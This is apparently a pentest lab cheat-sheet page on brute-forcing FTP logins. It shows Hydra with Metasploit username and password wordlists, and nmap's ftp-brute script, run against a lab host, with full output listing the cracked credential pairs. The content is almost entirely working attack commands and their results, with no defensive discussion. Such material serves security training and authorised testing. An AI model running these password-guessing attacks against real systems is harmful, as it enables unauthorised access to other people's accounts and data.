# FTP

## Brute Force Users

### Hydra

```bash
root@attackdefense:~# hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt $target ftp
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-17 00:49:54
[DATA] max 16 tasks per 1 server, overall 16 tasks, 7063 login tries (l:7/p:1009), ~442 tries per task
[DATA] attacking ftp://192.217.30.3:21/
[21][ftp] host: 192.217.30.3   login: sysadmin   password: 654321
[21][ftp] host: 192.217.30.3   login: rooty   password: qwerty
[21][ftp] host: 192.217.30.3   login: demo   password: butterfly
[21][ftp] host: 192.217.30.3   login: auditor   password: chocolate
[21][ftp] host: 192.217.30.3   login: anon   password: purple
[21][ftp] host: 192.217.30.3   login: administrator   password: tweety
[21][ftp] host: 192.217.30.3   login: diag   password: tigger
1 of 1 target successfully completed, 7 valid passwords found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-17 00:50:32
```

### nmap

```bash
root@attackdefense:~# cat users.txt
sysadmin

root@attackdefense:~# nmap $target -p21 --script ftp-brute --script-args userdb=users.txt
Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-17 01:01 UTC
Nmap scan report for target-1 (192.217.30.3)
Host is up (0.000040s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-brute:
|   Accounts:
|     sysadmin:654321 - Valid credentials
|_  Statistics: Performed 22 guesses in 5 seconds, average tps: 4.4
MAC Address: 02:42:C0:D9:1E:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 5.30 seconds
```

